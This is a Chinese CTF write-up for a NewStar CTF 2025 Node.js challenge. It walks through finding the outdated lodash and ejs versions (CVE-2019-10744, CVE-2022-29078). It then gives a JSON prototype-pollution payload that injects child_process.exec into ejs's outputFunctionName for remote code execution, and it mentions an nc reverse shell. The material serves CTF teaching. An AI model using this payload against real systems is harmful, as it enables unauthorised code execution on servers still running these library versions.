---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# 小 W 和小 K 的故事（最终章）

## 初步审计

在 CTF 中遇到 NodeJS 相关题目有很多固定的起始套路，我们一般可以根据这些套路先对环境进行初步的处理。

第一步为查看环境状态，众所周知，NodeJS 后端基本上是由一个个组件作为基础支撑搭建起来的，组件漏洞或者说供应链漏洞是非常常见的漏洞类型之一，在下发的 `src` 中，存在一个名为 `package.json` 的文件，这个文件中表明了该后端服务所使用的组件以及其版本。我们可以针对性的对这些组件进行搜索，如果其格式如 `"express": "^5.1.0"`，表明会自动拉取该组件**最新**的版本，如果没有 `^`，那么就会拉取一个**精确**的版本。

在本题中，这个知识点表现在 ejs 组件和 lodash 组件拉取的并不是最新版本，我们可以上网搜索这些组件该版本下是否存在漏洞。

通过搜索可以得到两个结果，分别是 CVE-2019-10744 和 CVE-2022-29078。通过这两个 CVE，我们再来完成这道题目，就轻而易举了。

## 漏洞利用。

首先，我们可以通过 `/addUser` 路由来进行任意的原型链污染操作，然后根据 CVE-2022-29078，由于 ejs 在进行模板渲染的时候，`outputFunctionName` 成员默认为空，所以直接用原型链污染为他赋值，然后植入我们的恶意代码就可以了。

最终 payload：

```json
{
    "content": {
        "constructor": {
            "prototype": {
            "outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('RCE code');var __tmp2"
            }
        }
    },
    "type": "test"
}
```

然后反复访问页面即可。

由于是无回显 RCE，所以你需要反弹 shell。但是因为镜像的原因，你需要使用 nc 来进行反弹 shell，具体操作留给读者自查。
